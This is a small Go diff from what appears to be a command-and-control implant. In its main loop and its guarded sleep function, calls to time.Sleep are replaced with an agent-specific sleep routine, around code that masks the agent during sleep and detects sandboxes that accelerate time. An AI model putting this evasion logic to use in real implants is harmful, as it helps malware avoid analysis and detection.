@@ -547,7 +547,7 @@ func mainLoop(ctx context.Context, agent *structs.Agent, c2 profiles.Profile, so
 					sleepSkipped = true
 				}
 			} else {
-				time.Sleep(sleepTime)
+				commands.AgentSleep(sleepTime)
 			}
 			if sleepMaskEnabled {
 				deobfuscateSleep(vault, agent, c2)
@@ -835,7 +835,7 @@ func guardedSleep(d time.Duration) bool {
 		return true
 	}
 	before := time.Now()
-	time.Sleep(d)
+	commands.AgentSleep(d)
 	elapsed := time.Since(before)
 	// If less than 75% of the requested duration actually elapsed,
 	// the sandbox is accelerating time.
